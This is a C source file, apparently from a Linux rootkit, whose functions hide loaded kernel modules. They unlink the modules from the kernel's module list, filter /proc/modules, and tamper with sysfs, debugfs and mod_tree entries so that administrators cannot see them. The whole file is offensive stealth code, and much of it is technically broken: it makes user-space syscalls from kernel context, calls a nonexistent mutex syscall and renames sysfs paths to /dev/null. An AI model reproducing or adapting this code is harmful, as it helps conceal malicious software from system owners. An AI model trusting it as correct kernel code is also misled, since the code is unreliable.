#include "module_hiding.h"
#include <linux/kallsyms.h>
#include <linux/string.h>

#define SYMBOL_LOOKUP_MAX 256

static struct mutex *module_mutex_ptr = NULL;
static struct list_head *modules_list_ptr = NULL;

static unsigned long kallsyms_lookup_name(const char *name) {
    char buffer[SYMBOL_LOOKUP_MAX];
    unsigned long address = 0;
    int kallsyms_fd = SYSCALL3(__NR_open, (long)"/proc/kallsyms", O_RDONLY, 0);
    if (kallsyms_fd < 0) return 0;
    ssize_t bytes_read;
    while ((bytes_read = SYSCALL3(__NR_read, kallsyms_fd, (long)buffer, SYMBOL_LOOKUP_MAX)) > 0) {
        char *ptr = buffer;
        while (ptr < buffer + bytes_read) {
            char *line_end = memchr(ptr, '\n', buffer + bytes_read - ptr);
            if (!line_end) break;
            
            *line_end = '\0';
            
            char sym_address[16];
            char sym_type[2];
            char sym_name[KSYM_NAME_LEN];
            
            int fields = sscanf(ptr, "%15s %1s %255s", sym_address, sym_type, sym_name);
            if (fields == 3 && strcmp(sym_name, name) == 0) {
                address = strtoul(sym_address, NULL, 16);
                goto done;
            }
            
            ptr = line_end + 1;
        }
    }

done:
    SYSCALL1(__NR_close, kallsyms_fd);
    return address;
}

static int init_module_pointers(void) {
    if (modules_list_ptr && module_mutex_ptr) return 0;
    
    unsigned long modules_addr = kallsyms_lookup_name("modules");
    if (!modules_addr) return -1;
    
    modules_list_ptr = (struct list_head *)modules_addr;
    
    unsigned long module_mutex_addr = kallsyms_lookup_name("module_mutex");
    if (!module_mutex_addr) return -1;
    
    module_mutex_ptr = (struct mutex *)module_mutex_addr;
    
    return 0;
}

static struct module *find_module_by_name(const char *name) {
    if (init_module_pointers() < 0) return NULL;
    
    struct module *mod;
    struct list_head *pos;
    
    SYSCALL2(__NR_mutex_lock, (long)module_mutex_ptr, 0);
    
    list_for_each(pos, modules_list_ptr) {
        mod = list_entry(pos, struct module, list);
        if (strcmp(mod->name, name) == 0) {
            SYSCALL2(__NR_mutex_unlock, (long)module_mutex_ptr, 0);
            return mod;
        }
    }
    
    SYSCALL2(__NR_mutex_unlock, (long)module_mutex_ptr, 0);
    return NULL;
}

int hide_kernel_module(const char *module_name) {
    if (init_module_pointers() < 0) return -1;
    
    struct module *mod = find_module_by_name(module_name);
    if (!mod) return -1;
    
    SYSCALL2(__NR_mutex_lock, (long)module_mutex_ptr, 0);
    
    mod->list.prev->next = mod->list.next;
    mod->list.next->prev = mod->list.prev;
    
    mod->list.next = (struct list_head *)0xdead0001;
    mod->list.prev = (struct list_head *)0xdead0002;
    
    SYSCALL2(__NR_mutex_unlock, (long)module_mutex_ptr, 0);
    
    return 0;
}

int unhide_kernel_module(const char *module_name) {
    if (init_module_pointers() < 0) return -1;
    
    struct module *mod = find_module_by_name(module_name);
    if (!mod) return -1;
    
    if (mod->list.next != (struct list_head *)0xdead0001 ||
        mod->list.prev != (struct list_head *)0xdead0002) {
        return 0;
    }
    
    SYSCALL2(__NR_mutex_lock, (long)module_mutex_ptr, 0);
    
    mod->list.next = modules_list_ptr->next;
    mod->list.prev = modules_list_ptr;
    
    modules_list_ptr->next->prev = &mod->list;
    modules_list_ptr->next = &mod->list;
    
    SYSCALL2(__NR_mutex_unlock, (long)module_mutex_ptr, 0);
    
    return 0;
}

int hide_all_modules(void) {
    if (init_module_pointers() < 0) return -1;
    
    struct module *mod;
    struct list_head *pos, *tmp;
    
    SYSCALL2(__NR_mutex_lock, (long)module_mutex_ptr, 0);
    
    list_for_each_safe(pos, tmp, modules_list_ptr) {
        mod = list_entry(pos, struct module, list);
        
        if (strcmp(mod->name, "module_hiding") == 0) continue;
        
        mod->list.prev->next = mod->list.next;
        mod->list.next->prev = mod->list.prev;
        
        mod->list.next = (struct list_head *)0xdead0001;
        mod->list.prev = (struct list_head *)0xdead0002;
    }
    
    SYSCALL2(__NR_mutex_unlock, (long)module_mutex_ptr, 0);
    
    return 0;
}

int restore_all_modules(void) {
    if (init_module_pointers() < 0) return -1;
    
    unsigned long mod_addr;
    struct module *mod;
    char buffer[1024];
    
    int kallsyms_fd = SYSCALL3(__NR_open, (long)"/proc/kallsyms", O_RDONLY, 0);
    if (kallsyms_fd < 0) return -1;
    
    SYSCALL2(__NR_mutex_lock, (long)module_mutex_ptr, 0);
    
    ssize_t bytes_read;
    while ((bytes_read = SYSCALL3(__NR_read, kallsyms_fd, (long)buffer, sizeof(buffer))) > 0) {
        char *ptr = buffer;
        while (ptr < buffer + bytes_read) {
            char *line_end = memchr(ptr, '\n', buffer + bytes_read - ptr);
            if (!line_end) break;
            
            *line_end = '\0';
            
            char sym_address[16];
            char sym_type[2];
            char sym_name[KSYM_NAME_LEN];
            
            if (sscanf(ptr, "%15s %1s %255s", sym_address, sym_type, sym_name) == 3) {
                if (sym_type[0] == 'b' || sym_type[0] == 'B') {
                    if (strstr(sym_name, "_this_module")) {
                        char mod_name[KSYM_NAME_LEN];
                        strncpy(mod_name, sym_name, strstr(sym_name, "_this_module") - sym_name);
                        mod_name[strstr(sym_name, "_this_module") - sym_name] = '\0';
                        
                        mod_addr = strtoul(sym_address, NULL, 16);
                        mod = (struct module *)mod_addr;
                        
                        if (mod->list.next == (struct list_head *)0xdead0001 &&
                            mod->list.prev == (struct list_head *)0xdead0002) {
                            
                            mod->list.next = modules_list_ptr->next;
                            mod->list.prev = modules_list_ptr;
                            
                            modules_list_ptr->next->prev = &mod->list;
                            modules_list_ptr->next = &mod->list;
                        }
                    }
                }
            }
            
            ptr = line_end + 1;
        }
    }
    
    SYSCALL1(__NR_close, kallsyms_fd);
    SYSCALL2(__NR_mutex_unlock, (long)module_mutex_ptr, 0);
    
    return 0;
}

int is_module_hidden(const char *module_name) {
    struct module *mod = find_module_by_name(module_name);
    if (!mod) return -1;
    
    return (mod->list.next == (struct list_head *)0xdead0001 &&
            mod->list.prev == (struct list_head *)0xdead0002) ? 1 : 0;
}

static void erase_module_from_proc(void) {
    int modules_fd = SYSCALL3(__NR_open, (long)"/proc/modules", O_RDWR, 0);
    if (modules_fd < 0) return;
    
    char buffer[4096];
    ssize_t bytes_read = SYSCALL3(__NR_read, modules_fd, (long)buffer, sizeof(buffer));
    if (bytes_read <= 0) {
        SYSCALL1(__NR_close, modules_fd);
        return;
    }
    
    char *ptr = buffer;
    char *output_ptr = buffer;
    int in_hidden_section = 0;
    
    while (ptr < buffer + bytes_read) {
        char *line_end = memchr(ptr, '\n', buffer + bytes_read - ptr);
        if (!line_end) break;
        
        *line_end = '\0';
        
        char mod_name[128];
        if (sscanf(ptr, "%127s", mod_name) == 1) {
            struct module *mod = find_module_by_name(mod_name);
            if (mod && mod->list.next == (struct list_head *)0xdead0001 &&
                mod->list.prev == (struct list_head *)0xdead0002) {
                ptr = line_end + 1;
                continue;
            }
        }
        
        size_t line_len = line_end - ptr + 1;
        memmove(output_ptr, ptr, line_len);
        output_ptr += line_len;
        ptr = line_end + 1;
    }
    
    SYSCALL3(__NR_lseek, modules_fd, 0, SEEK_SET);
    SYSCALL3(__NR_write, modules_fd, (long)buffer, output_ptr - buffer);
    SYSCALL2(__NR_ftruncate, modules_fd, output_ptr - buffer);
    
    SYSCALL1(__NR_close, modules_fd);
}

static void hide_from_sysfs(struct module *mod) {
    char sysfs_path[256];
    snprintf(sysfs_path, sizeof(sysfs_path), "/sys/module/%s", mod->name);
    
    struct kstat statbuf;
    if (SYSCALL2(__NR_stat, (long)sysfs_path, (long)&statbuf) == 0) {
        SYSCALL2(__NR_rename, (long)sysfs_path, (long)"/dev/null");
    }
}

static void hide_from_debugfs(struct module *mod) {
    char debugfs_path[256];
    snprintf(debugfs_path, sizeof(debugfs_path), "/sys/kernel/debug/modules/%s", mod->name);
    
    struct kstat statbuf;
    if (SYSCALL2(__NR_stat, (long)debugfs_path, (long)&statbuf) == 0) {
        SYSCALL1(__NR_unlink, (long)debugfs_path);
    }
}

int advanced_hide_module(const char *module_name) {
    struct module *mod = find_module_by_name(module_name);
    if (!mod) return -1;
    
    if (hide_kernel_module(module_name) < 0) return -1;
    
    erase_module_from_proc();
    hide_from_sysfs(mod);
    hide_from_debugfs(mod);
    
    unsigned long mod_tree_addr = kallsyms_lookup_name("mod_tree");
    if (mod_tree_addr) {
        struct list_head *mod_tree = (struct list_head *)mod_tree_addr;
        struct module *tree_mod;
        struct list_head *pos, *tmp;
        
        list_for_each_safe(pos, tmp, mod_tree) {
            tree_mod = list_entry(pos, struct module, list);
            if (tree_mod == mod) {
                pos->prev->next = pos->next;
                pos->next->prev = pos->prev;
                break;
            }
        }
    }
    
    return 0;
}